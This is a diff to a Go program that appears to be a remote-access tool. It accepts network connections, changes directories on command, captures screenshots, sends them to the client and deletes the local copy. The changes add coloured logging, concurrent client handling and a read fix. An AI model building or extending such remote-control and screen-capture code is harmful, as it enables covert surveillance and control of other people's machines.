@@ -15,6 +15,7 @@ import (
 	"errors"
 	"fmt"
 	"image/png"
+	"io"
 	"net"
 	"os"
 	"os/exec"
@@ -22,17 +23,22 @@ import (
 	"syscall"
 	"time"
 
+	colorgo "github.com/Urban20/ColorGo"
 	"github.com/kbinani/screenshot"
 )
 
 const TAMAÑO_BUFFER = 1024 // buffer para comandos promedios
+
+var ROJO = colorgo.Formateo("ROJO")
+var VERDE = colorgo.Formateo("VERDE")
+var RESET = colorgo.Formateo("RESET")
 
 // funcion similar a Envio( ) con la unica diferencia de que es para enviar imagenes por la red
 func Enviar_img(conexion net.Conn, archivo string) error {
 	buffer_tamaño := make([]byte, 8)
 
 	imagen, open_error := os.Open(archivo)
-	fmt.Println("-- se lee la imagen a enviar")
+	fmt.Println(VERDE + "\n-- se lee la imagen a enviar")
 
 	if open_error != nil {
 		return errors.New("[!] no se encuentra la imagen")
@@ -48,7 +54,7 @@ func Enviar_img(conexion net.Conn, archivo string) error {
 
 	buffer_img := make([]byte, img_tamaño) // obtengo el tamaño y creo un buffer
 
-	_, read_error := imagen.Read(buffer_img)
+	_, read_error := io.ReadFull(imagen, buffer_img)
 
 	if read_error != nil {
 		return errors.New("[!] error al codificar imagen")
@@ -69,7 +75,7 @@ func Enviar_img(conexion net.Conn, archivo string) error {
 	if err != nil {
 		return err
 	}
-	fmt.Println("-- eliminacion de imagen completado")
+	fmt.Print("-- eliminacion de imagen completado\n\n" + RESET)
 	return nil
 }
 
@@ -107,6 +113,7 @@ func Ss(conexion net.Conn) error {
 
 // funcion que implementa la logica del comando cd
 func Cd(entrada string, cliente net.Conn) {
+	fmt.Println(VERDE + "se ejecuta el comando cd" + RESET)
 	ruta, compile_error := regexp.Compile(`cd (\S+)`)
 	if compile_error != nil {
 		fmt.Println(compile_error)
@@ -118,8 +125,11 @@ func Cd(entrada string, cliente net.Conn) {
 			ch_error := os.Chdir(ruta_str)
 			if ch_error != nil {
 				Envio(cliente, []byte("[!] error cambiando ruta"))
+				fmt.Println(VERDE + "error cambiando ruta" + RESET)
+
 			} else {
 				Envio(cliente, []byte("[*] ruta actualizada"))
+				fmt.Println(VERDE + "ruta actualizada" + RESET)
 			}
 		}
 	}
@@ -151,7 +161,7 @@ func Envio(conexion net.Conn, salida []byte) error {
 	return nil
 }
 
-// por cada comando se cierra la conecion y se acepta una nueva
+// por cada comando se cierra la conexion y se acepta una nueva
 func Escucha(conn net.Listener) {
 	for {
 
@@ -159,7 +169,7 @@ func Escucha(conn net.Listener) {
 		if accept_error != nil {
 			fmt.Println(accept_error)
 		}
-		Cliente(cliente)
+		go Cliente(cliente)
 	}
 }
 
@@ -192,7 +202,9 @@ func Cliente(cliente net.Conn) {
 		case <-contx.Done():
 			Envio(cliente, []byte("[!] SS tardo demasiado en responder"))
 		case erro := <-ch_err:
-			Envio(cliente, []byte(fmt.Sprintf("[!] hubo un error durante el screenshot : %s", erro)))
+			if erro != nil {
+				fmt.Println("[!] hubo un error durante el screenshot : ", erro)
+			}
 		}
 
 	} else if entrada == "q" {
